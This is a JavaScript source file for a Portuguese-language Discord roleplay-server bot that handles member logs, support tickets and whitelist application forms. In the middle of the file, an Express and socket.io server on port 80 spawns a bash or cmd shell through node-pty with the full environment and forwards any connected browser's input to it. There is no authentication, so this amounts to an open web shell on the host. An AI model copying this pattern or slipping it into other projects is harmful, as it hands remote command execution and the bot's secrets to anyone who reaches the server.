const Discord = require("discord.js");
const { Client, GatewayIntentBits, ActivityType, ApplicationCommandType, ApplicationCommandOptionType} = require('discord.js');
const { EmbedBuilder, Events, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const config = require("./config.json");
const pergunstas = require("./pergunstas.json");
const express = require('express');
const app = express();
const client = new Client({ 	
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});
module.exports = client;
client.commands = new Discord.Collection();
client.slashCommands = new Discord.Collection();
client.config = require("./config.json");
client.pergunstas = require("./pergunstas.json");
require("./handler")(client);
const { glob } = require("glob");
const { promisify } = require("util");

client.on("guildMemberAdd", (member) => {
	try {
		member.roles.add(config.servidores.Dulino.Cargos.Offilist)
        client.guilds.cache.get(config.servidores.Dulino.ServerID).channels.cache.get(config.servidores.Dulino.Canais.Logs.Entrada).send({
            content: `👉 ${member.user} entrou no servidor!`
        })
        // console.log(`setado ${member.user}`)
	} catch (e) {
		console.log(e);
	}
});

client.on("guildMemberRemove", (member) => {
	try {
        client.guilds.cache.get(config.servidores.Dulino.ServerID).channels.cache.get(config.servidores.Dulino.Canais.Logs.Saida).send({
            content: `👈 ${member.user.tag} saiu do servidor...!`
        })
        // console.log(`setado ${member.user}`)
	} catch (e) {
		console.log(e);
	}
});

client.on('ready', async () => {
    console.log(`✅ - Logado em ${client.user.username} com sucesso! Estou em ${client.guilds.cache.size} servidores!`)
    client.user.setPresence({
        activities: [{ name: `Visual Studio Code 📄`, type: ActivityType.Playing }],
        status: 'dnd',
      });
});

client.on("interactionCreate", async (interaction) => {

    if (!interaction.guild) return;
  
    if (interaction.isCommand()) {

        const cmd = client.slashCommands.get(interaction.commandName);

        if (!cmd)
            return;

        const args = [];

        for (let option of interaction.options.data) {

            if (option.type === "SUB_COMMAND") {
                if (option.name) args.push(option.name);
                option.options?.forEach((x) => {
                    if (x.value) args.push(x.value);
                });
            } else if (option.value) args.push(option.value);
        }

        cmd.run(client, interaction, args);
    }

    if (interaction.isUserContextMenuCommand()) {
        await interaction.deferReply({ ephemeral: false });
        const command = client.slashCommands.get(interaction.commandName);
        if (command) command.run(client, interaction);
        
    }
});

const http = require('http').Server(app);
const io = require('socket.io')(http);
const pty = require('node-pty');

app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

io.on('connection', (socket) => {
  console.log('Novo Acesso');

  const term = pty.spawn(process.platform === 'win32' ? 'cmd.exe' : 'bash', [], {
    name: 'xterm-color',
    cols: 80,
    rows: 24,
    cwd: process.env.HOME,
    env: process.env
  });

  term.onData((data) => {
    socket.emit('output', data);
  });

  socket.on('input', (data) => {
    term.write(data);
  });

  socket.on('disconnect', () => {
    term.kill();
    console.log('Desconectado ');
  });
});

const port = process.env.PORT || 80;
http.listen(port, () => {
  console.log(`Servidor rodando no ip http://localhost:${port}`);
});


client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isStringSelectMenu()) return;

	const selected = interaction.values[0];

    if (selected === 'atendimento_option') {

        //   ============================================================================================= //
        const serverId = config.servidores.Dulino.ServerID; 
        const guild = client.guilds.cache.get(serverId);
        const categoryId = config.servidores.Dulino.Categorias.Ticket;
        const category = guild.channels.cache.get(categoryId);

        const member = interaction.member;
        const nome = interaction.user.username;
        const channelName = `📝・atendimento_${nome}`;

        const staffRoleID = config.servidores.Dulino.Cargos.EmServico; 
        const staffRole = guild.roles.cache.get(staffRoleID);

        const OpdedRoleID = config.servidores.Dulino.Cargos.Opded;
        const OpdedRole = guild.roles.cache.get(OpdedRoleID);
      
        const existingChannel = category.children.cache.find(channel => channel.name === channelName);
        if (existingChannel) {
            interaction.reply(`Você já tem um ticket aberto: <#${existingChannel.id}>`);
            return;
        }

        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category.id,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
                deny: [PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: member.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: staffRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: OpdedRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            }
          ]
        }).then(channel => {

            interaction.reply({
                content: `Canal ${channel.name} criado com sucesso!.`,
                ephemeral: true
            });

            const Horas = new Date();
            const hora = Horas.getHours();
            const minutos = Horas.getMinutes();
    
            const Dia = new Date();
            const dia = Dia.getDate().toString().padStart(2, '0');
            const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
            const ano = Dia.getFullYear().toString();

            const AbrirTicket = new EmbedBuilder()
            .setColor(0x0099FF)
            .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
            .setTitle("⏰・**Novo Atendimento**!")
            .setDescription(`Olá ${member.user.username}, bem-vindo ao seu ticket!`)
            .addFields(
                { name: 'Membro:', value: `${interaction.user.toString()}`, inline: true },
                { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
                { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
            )
            .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('delete_ticket')
                        .setLabel('Deletar Ticket')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🗑️'),
                );

            channel.send({
                embeds: [AbrirTicket],
                components: [row]
            });

            const filter = i => i.customId === 'delete_ticket' && i.user.id === interaction.user.id;
            const collector = channel.createMessageComponentCollector({ filter, time: 5000 });
          
            collector.on('collect', async i => {
              await channel.delete();
              i.reply({ content: 'O canal foi excluído com sucesso.', ephemeral: true });
            });

        

          }).catch(error => {
            console.error(`Erro ao criar canal: ${error}`);
            interaction.reply({
                content: `Ocorreu um erro ao criar o ticket. Por favor, tente novamente mais tarde.`,
                ephemeral: true
            });
          });
        //   ============================================================================================= //
        
    } else if (selected === 'reportar_bugs_option') {
 
        //   ============================================================================================= //
        const serverId = config.servidores.Dulino.ServerID; 
        const guild = client.guilds.cache.get(serverId);
        const categoryId = config.servidores.Dulino.Categorias.Ticket;
        const category = guild.channels.cache.get(categoryId);

        const member = interaction.member;
        const nome = interaction.user.username;
        const channelName = `📝・report_bugs_${nome}`;

        const staffRoleID = config.servidores.Dulino.Cargos.Developer; 
        const staffRole = guild.roles.cache.get(staffRoleID);

        const OpdedRoleID = config.servidores.Dulino.Cargos.Opded;
        const OpdedRole = guild.roles.cache.get(OpdedRoleID);
      
        const existingChannel = category.children.cache.find(channel => channel.name === channelName);
        if (existingChannel) {
            interaction.reply(`Você já tem um ticket aberto: <#${existingChannel.id}>`);
            return;
        }

        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category.id,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
                deny: [PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: member.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: staffRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: OpdedRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            }
          ]
        }).then(channel => {

            interaction.reply({
                content: `Canal ${channel.name} criado com sucesso!.`,
                ephemeral: true
            });

            const Horas = new Date();
            const hora = Horas.getHours();
            const minutos = Horas.getMinutes();
    
            const Dia = new Date();
            const dia = Dia.getDate().toString().padStart(2, '0');
            const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
            const ano = Dia.getFullYear().toString();

            const AbrirTicket = new EmbedBuilder()
            .setColor(0x0099FF)
            .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
            .setTitle("⏰・**Novo Atendimento**!")
            .setDescription(`Olá ${member.user.username}, bem-vindo ao seu ticket!`)
            .addFields(
                { name: 'Membro:', value: `${interaction.user.toString()}`, inline: true },
                { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
                { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
            )
            .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('delete_ticket')
                        .setLabel('Deletar Ticket')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🗑️'),
                );

            channel.send({
                embeds: [AbrirTicket],
                components: [row]
            });

            const filter = i => i.customId === 'delete_ticket' && i.user.id === interaction.user.id;
            const collector = channel.createMessageComponentCollector({ filter, time: 5000 });
          
            collector.on('collect', async i => {
              await channel.delete();
              i.reply({ content: 'O canal foi excluído com sucesso.', ephemeral: true });
            });



          }).catch(error => {
            console.error(`Erro ao criar canal: ${error}`);
            interaction.reply({
                content: `Ocorreu um erro ao criar o ticket. Por favor, tente novamente mais tarde.`,
                ephemeral: true
            });
          });
        //   ============================================================================================= //

    }  else if (selected === 'reportar_staff_option') {
        
        //   ============================================================================================= //
        const serverId = config.servidores.Dulino.ServerID; 
        const guild = client.guilds.cache.get(serverId);
        const categoryId = config.servidores.Dulino.Categorias.Ticket;
        const category = guild.channels.cache.get(categoryId);

        const member = interaction.member;
        const nome = interaction.user.username;
        const channelName = `📝・report_staff_${nome}`;

        const staffRoleID = config.servidores.Dulino.Cargos.GestaoPessoa; 
        const staffRole = guild.roles.cache.get(staffRoleID);

        const OpdedRoleID = config.servidores.Dulino.Cargos.Opded;
        const OpdedRole = guild.roles.cache.get(OpdedRoleID);
      
        const existingChannel = category.children.cache.find(channel => channel.name === channelName);
        if (existingChannel) {
            interaction.reply(`Você já tem um ticket aberto: <#${existingChannel.id}>`);
            return;
        }

        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category.id,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
                deny: [PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: member.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: staffRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: OpdedRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            }
          ]
        }).then(channel => {

            interaction.reply({
                content: `Canal ${channel.name} criado com sucesso!.`,
                ephemeral: true
            });

            const Horas = new Date();
            const hora = Horas.getHours();
            const minutos = Horas.getMinutes();
    
            const Dia = new Date();
            const dia = Dia.getDate().toString().padStart(2, '0');
            const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
            const ano = Dia.getFullYear().toString();

            const AbrirTicket = new EmbedBuilder()
            .setColor(0x0099FF)
            .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
            .setTitle("⏰・**Novo Atendimento**!")
            .setDescription(`Olá ${member.user.username}, bem-vindo ao seu ticket!`)
            .addFields(
                { name: 'Membro:', value: `${interaction.user.toString()}`, inline: true },
                { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
                { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
            )
            .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('delete_ticket')
                        .setLabel('Deletar Ticket')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🗑️'),
                );

            channel.send({
                embeds: [AbrirTicket],
                components: [row]
            });

            const filter = i => i.customId === 'delete_ticket' && i.user.id === interaction.user.id;
            const collector = channel.createMessageComponentCollector({ filter, time: 5000 });
          
            collector.on('collect', async i => {
              await channel.delete();
              i.reply({ content: 'O canal foi excluído com sucesso.', ephemeral: true });
            });



          }).catch(error => {
            console.error(`Erro ao criar canal: ${error}`);
            interaction.reply({
                content: `Ocorreu um erro ao criar o ticket. Por favor, tente novamente mais tarde.`,
                ephemeral: true
            });
          });
        //   ============================================================================================= //

	} else if (selected === 'reportar_players_option') {
		        
        //   ============================================================================================= //
        const serverId = config.servidores.Dulino.ServerID; 
        const guild = client.guilds.cache.get(serverId);
        const categoryId = config.servidores.Dulino.Categorias.Ticket;
        const category = guild.channels.cache.get(categoryId);

        const member = interaction.member;
        const nome = interaction.user.username;
        const channelName = `📝・atendimento_${nome}`;

        const staffRoleID = config.servidores.Dulino.Cargos.EmServico; 
        const staffRole = guild.roles.cache.get(staffRoleID);

        const OpdedRoleID = config.servidores.Dulino.Cargos.Opded;
        const OpdedRole = guild.roles.cache.get(OpdedRoleID);
      
        const existingChannel = category.children.cache.find(channel => channel.name === channelName);
        if (existingChannel) {
            interaction.reply(`Você já tem um ticket aberto: <#${existingChannel.id}>`);
            return;
        }

        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          parent: category.id,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
                deny: [PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: member.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: staffRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            },
            {
                id: OpdedRole.id,
                allow: [PermissionsBitField.Flags.ViewChannel],
            }
          ]
        }).then(channel => {

            interaction.reply({
                content: `Canal ${channel.name} criado com sucesso!.`,
                ephemeral: true
            });
            
            const Horas = new Date();
            const hora = Horas.getHours();
            const minutos = Horas.getMinutes();
    
            const Dia = new Date();
            const dia = Dia.getDate().toString().padStart(2, '0');
            const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
            const ano = Dia.getFullYear().toString();

            const AbrirTicket = new EmbedBuilder()
            .setColor(0x0099FF)
            .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
            .setTitle("⏰・**Novo Atendimento**!")
            .setDescription(`Olá ${member.user.username}, bem-vindo ao seu ticket!`)
            .addFields(
                { name: 'Membro:', value: `${interaction.user.toString()}`, inline: true },
                { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
                { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
            )
            .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('delete_ticket')
                        .setLabel('Deletar Ticket')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🗑️'),
                );

            channel.send({
                embeds: [AbrirTicket],
                components: [row]
            });

            const filter = i => i.customId === 'delete_ticket' && i.user.id === interaction.user.id;
            const collector = channel.createMessageComponentCollector({ filter, time: 5000 });
          
            collector.on('collect', async i => {
              await channel.delete();
              i.reply({ content: 'O canal foi excluído com sucesso.', ephemeral: true });
            });


          }).catch(error => {
            console.error(`Erro ao criar canal: ${error}`);
            interaction.reply({
                content: `Ocorreu um erro ao criar o ticket. Por favor, tente novamente mais tarde.`,
                ephemeral: true
            });
          });
        //   ============================================================================================= //

	};

    if (selected === 'policia_option') {

      const modal = new ModalBuilder()
			.setCustomId('PoliciaModal')
			.setTitle(pergunstas.Concusos.PoliciaModal);


      const nome = new TextInputBuilder()
        .setCustomId('nome')
        .setLabel(pergunstas.Concusos.Policia.nome)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta1 = new TextInputBuilder()
        .setCustomId('pergunta1')
        .setLabel(pergunstas.Concusos.Policia.pergunta1)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta2 = new TextInputBuilder()
        .setCustomId('pergunta2')
        .setLabel(pergunstas.Concusos.Policia.pergunta2)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta3 = new TextInputBuilder()
        .setCustomId('pergunta3')
        .setLabel(pergunstas.Concusos.Policia.pergunta3)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta4 = new TextInputBuilder()
        .setCustomId('pergunta4')
        .setLabel(pergunstas.Concusos.Policia.pergunta4)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Paragraph);
       

      const opcao1 = new ActionRowBuilder().addComponents(nome);
      const opcao2 = new ActionRowBuilder().addComponents(pergunta1);
      const opcao3 = new ActionRowBuilder().addComponents(pergunta2);
      const opcao4 = new ActionRowBuilder().addComponents(pergunta3);
      const opcao5 = new ActionRowBuilder().addComponents(pergunta4);

      modal.addComponents(
        opcao1,
        opcao2,
        opcao3,
        opcao4,
        opcao5,
      );
    
      await interaction.showModal(modal);

    } else if (selected === 'medico_option') {

      const modal = new ModalBuilder()
			.setCustomId('HospitalModal')
			.setTitle(pergunstas.Concusos.HospitalModal);


      const nome = new TextInputBuilder()
        .setCustomId('nome')
        .setLabel(pergunstas.Concusos.Hospital.nome)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta1 = new TextInputBuilder()
        .setCustomId('pergunta1')
        .setLabel(pergunstas.Concusos.Hospital.pergunta1)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta2 = new TextInputBuilder()
        .setCustomId('pergunta2')
        .setLabel(pergunstas.Concusos.Hospital.pergunta2)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta3 = new TextInputBuilder()
        .setCustomId('pergunta3')
        .setLabel(pergunstas.Concusos.Hospital.pergunta3)
        .setPlaceholder('Resposta: Sim | Não')
        .setStyle(TextInputStyle.Short);


      const pergunta4 = new TextInputBuilder()
        .setCustomId('pergunta4')
        .setLabel(pergunstas.Concusos.Hospital.pergunta4)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Paragraph);
       

      const opcao1 = new ActionRowBuilder().addComponents(nome);
      const opcao2 = new ActionRowBuilder().addComponents(pergunta1);
      const opcao3 = new ActionRowBuilder().addComponents(pergunta2);
      const opcao4 = new ActionRowBuilder().addComponents(pergunta3);
      const opcao5 = new ActionRowBuilder().addComponents(pergunta4);

      modal.addComponents(
        opcao1,
        opcao2,
        opcao3,
        opcao4,
        opcao5,
      );
    
      await interaction.showModal(modal);

    };

    if (selected === 'dulino_rp_option') {

      const modal = new ModalBuilder()
			.setCustomId('DulinoRPModal')
			.setTitle(pergunstas.Concusos.DulinoRPModal);


      const nome = new TextInputBuilder()
        .setCustomId('nome')
        .setLabel(pergunstas.Concusos.DulinoRP.nome)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta1 = new TextInputBuilder()
        .setCustomId('pergunta1')
        .setLabel(pergunstas.Concusos.DulinoRP.pergunta1)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta2 = new TextInputBuilder()
        .setCustomId('pergunta2')
        .setLabel(pergunstas.Concusos.DulinoRP.pergunta2)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta3 = new TextInputBuilder()
        .setCustomId('pergunta3')
        .setLabel(pergunstas.Concusos.DulinoRP.pergunta3)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta4 = new TextInputBuilder()
        .setCustomId('pergunta4')
        .setLabel(pergunstas.Concusos.DulinoRP.pergunta4)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Paragraph);
       

      const opcao1 = new ActionRowBuilder().addComponents(nome);
      const opcao2 = new ActionRowBuilder().addComponents(pergunta1);
      const opcao3 = new ActionRowBuilder().addComponents(pergunta2);
      const opcao4 = new ActionRowBuilder().addComponents(pergunta3);
      const opcao5 = new ActionRowBuilder().addComponents(pergunta4);

      modal.addComponents(
        opcao1,
        opcao2,
        opcao3,
        opcao4,
        opcao5,
      );
    
      await interaction.showModal(modal);

    } else if (selected === 'dulino_school_option') {

      const modal = new ModalBuilder()
			.setCustomId('DulinoSchoolModal')
			.setTitle(pergunstas.Concusos.DulinoSchoolModal);


      const nome = new TextInputBuilder()
        .setCustomId('nome')
        .setLabel(pergunstas.Concusos.DulinoSchool.nome)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta1 = new TextInputBuilder()
        .setCustomId('pergunta1')
        .setLabel(pergunstas.Concusos.DulinoSchool.pergunta1)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta2 = new TextInputBuilder()
        .setCustomId('pergunta2')
        .setLabel(pergunstas.Concusos.DulinoSchool.pergunta2)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta3 = new TextInputBuilder()
        .setCustomId('pergunta3')
        .setLabel(pergunstas.Concusos.DulinoSchool.pergunta3)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Short);


      const pergunta4 = new TextInputBuilder()
        .setCustomId('pergunta4')
        .setLabel(pergunstas.Concusos.DulinoSchool.pergunta4)
        .setPlaceholder('Resposta: Texto Breve')
        .setStyle(TextInputStyle.Paragraph);
       

      const opcao1 = new ActionRowBuilder().addComponents(nome);
      const opcao2 = new ActionRowBuilder().addComponents(pergunta1);
      const opcao3 = new ActionRowBuilder().addComponents(pergunta2);
      const opcao4 = new ActionRowBuilder().addComponents(pergunta3);
      const opcao5 = new ActionRowBuilder().addComponents(pergunta4);

      modal.addComponents(
        opcao1,
        opcao2,
        opcao3,
        opcao4,
        opcao5,
      );
    
      await interaction.showModal(modal);

    };
});


client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isModalSubmit()) return;
  
    if (interaction.customId === 'PoliciaModal') {

      const nome = interaction.fields.getTextInputValue('nome');
      const pergunta1 = interaction.fields.getTextInputValue('pergunta1');
      const pergunta2 = interaction.fields.getTextInputValue('pergunta2');
      const pergunta3 = interaction.fields.getTextInputValue('pergunta3');
      const pergunta4 = interaction.fields.getTextInputValue('pergunta4');

      const Horas = new Date();
      const hora = Horas.getHours();
      const minutos = Horas.getMinutes();

      const Dia = new Date();
      const dia = Dia.getDate().toString().padStart(2, '0');
      const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
      const ano = Dia.getFullYear().toString();

      const RecPm = new EmbedBuilder()
      .setColor(0x0099FF)
      .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
      .setTitle("📑 **Novo Concurso**!")
      .addFields(
          { name: 'Participante:', value: `${nome}`, inline: true },
      )
      .addFields(
        { name: 'Polícia pode adentrar casa em perseguição?', value: `${pergunta1}` },
        { name: '\n', value: '\n' },
        { name: 'Polícia dispara em áreas vermelhas?', value: `${pergunta2}` },
        { name: '\n', value: '\n' },
        { name: 'Você respeita a hierarquia?', value: `${pergunta3}` },
        { name: '\n', value: '\n' },
        { name: 'Qual a função do Soldado?', value: `${pergunta4}` },
        { name: '\n', value: '\n' },
        { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
        { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
      )
      .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

      client.channels.cache.get(config.servidores.Dulino.Canais.Empregos.Policia).send({ embeds: [RecPm] });

      await interaction.reply({
          content: `Concurso realizado com sucesso!`,
          ephemeral: true
      });
    } else if (interaction.customId === 'HospitalModal') {

      const nome = interaction.fields.getTextInputValue('nome');
      const pergunta1 = interaction.fields.getTextInputValue('pergunta1');
      const pergunta2 = interaction.fields.getTextInputValue('pergunta2');
      const pergunta3 = interaction.fields.getTextInputValue('pergunta3');
      const pergunta4 = interaction.fields.getTextInputValue('pergunta4');

      const Horas = new Date();
      const hora = Horas.getHours();
      const minutos = Horas.getMinutes();

      const Dia = new Date();
      const dia = Dia.getDate().toString().padStart(2, '0');
      const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
      const ano = Dia.getFullYear().toString();

      const RecPm = new EmbedBuilder()
      .setColor(0x0099FF)
      .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
      .setTitle("📑 **Novo Concurso**!")
      .addFields(
          { name: 'Participante:', value: `${nome}`, inline: true },
      )
      .addFields(
        { name: 'Médico pode apenas dar tratamento?', value: `${pergunta1}` },
        { name: '\n', value: '\n' },
        { name: 'Médico pode farmar salario?', value: `${pergunta2}` },
        { name: '\n', value: '\n' },
        { name: 'Médico preciso fazer RP?', value: `${pergunta3}` },
        { name: '\n', value: '\n' },
        { name: 'Qual a função de um Médico?', value: `${pergunta4}` },
        { name: '\n', value: '\n' },
        { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
        { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
      )
      .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

      client.channels.cache.get(config.servidores.Dulino.Canais.Empregos.Hospital).send({ embeds: [RecPm] });

      await interaction.reply({
          content: `Concurso realizado com sucesso!`,
          ephemeral: true
      });
    };

    if (interaction.customId === 'DulinoRPModal') {

      const nome = interaction.fields.getTextInputValue('nome');
      const pergunta1 = interaction.fields.getTextInputValue('pergunta1');
      const pergunta2 = interaction.fields.getTextInputValue('pergunta2');
      const pergunta3 = interaction.fields.getTextInputValue('pergunta3');
      const pergunta4 = interaction.fields.getTextInputValue('pergunta4');

      const Horas = new Date();
      const hora = Horas.getHours();
      const minutos = Horas.getMinutes();

      const Dia = new Date();
      const dia = Dia.getDate().toString().padStart(2, '0');
      const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
      const ano = Dia.getFullYear().toString();

      const WlDulinoRP = new EmbedBuilder()
      .setColor(0x0099FF)
      .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
      .setTitle("📑 **Nova Wl Dulino RP**!")
      .addFields(
          { name: 'Participante:', value: `${nome}`, inline: true },
      )
      .addFields(
        { name: 'O que é anti-rp?', value: `${pergunta1}` },
        { name: '\n', value: '\n' },
        { name: 'O que é dark-rp?', value: `${pergunta2}` },
        { name: '\n', value: '\n' },
        { name: 'O que é anti amor a vida?', value: `${pergunta3}` },
        { name: '\n', value: '\n' },
        { name: 'Fale um pouco sobre você!', value: `${pergunta4}` },
        { name: '\n', value: '\n' },
        { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
        { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
      )
      .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });


      let role = interaction.guild.roles.cache.get(config.servidores.Dulino.Cargos.SemiAprovado);
      let semwl = interaction.guild.roles.cache.get(config.servidores.Dulino.Cargos.Offilist);

      const member = interaction.member;

      member.roles.remove(semwl);
      member.roles.add(role);

      client.channels.cache.get(config.servidores.Dulino.Canais.Logs.WlDulinoRP).send({ embeds: [WlDulinoRP] });

      await interaction.reply({
          content: `Concurso realizado com sucesso!`,
          ephemeral: true
      });
      
    } else if (interaction.customId === 'DulinoSchoolModal') {

      // const nome = interaction.fields.getTextInputValue('nome');
      // const pergunta1 = interaction.fields.getTextInputValue('pergunta1');
      // const pergunta2 = interaction.fields.getTextInputValue('pergunta2');
      // const pergunta3 = interaction.fields.getTextInputValue('pergunta3');
      // const pergunta4 = interaction.fields.getTextInputValue('pergunta4');

      // const Horas = new Date();
      // const hora = Horas.getHours();
      // const minutos = Horas.getMinutes();

      // const Dia = new Date();
      // const dia = Dia.getDate().toString().padStart(2, '0');
      // const mes = (Dia.getMonth() + 1).toString().padStart(2, '0');
      // const ano = Dia.getFullYear().toString();

      // const WlDulinoSchool = new EmbedBuilder()
      // .setColor(0x0099FF)
      // .setThumbnail(`${config.servidores.Dulino.Images.Logo}`)
      // .setTitle("📑 **Nova WL Dulino School**!")
      // .addFields(
      //     { name: 'Participante:', value: `${nome}`, inline: true },
      // )
      // .addFields(
      //   { name: 'O que é anti-rp?', value: `${pergunta1}` },
      //   { name: '\n', value: '\n' },
      //   { name: 'O que é dark-rp?', value: `${pergunta2}` },
      //   { name: '\n', value: '\n' },
      //   { name: 'O que é anti amor a vida?', value: `${pergunta3}` },
      //   { name: '\n', value: '\n' },
      //   { name: 'Fale um pouco sobre você!', value: `${pergunta4}` },
      //   { name: '\n', value: '\n' },
      //   { name: 'Data:', value: `*${dia}/${mes}/${ano}*`, inline: true },
      //   { name: 'Horas:', value: `*${hora}:${minutos}*`, inline: true },
      // )
      // .setFooter({ text: config.servidores.Dulino.Informativos.Direitos, iconURL: `${config.servidores.Dulino.Images.Logo}` });

      // client.channels.cache.get(config.servidores.Dulino.Canais.Logs.WlDulinoEscola).send({ embeds: [WlDulinoSchool] });

      await interaction.reply({
          content: `No momento as inscrições estão desativadas!`,
          ephemeral: true
      });
    };


});


client.login(config.token);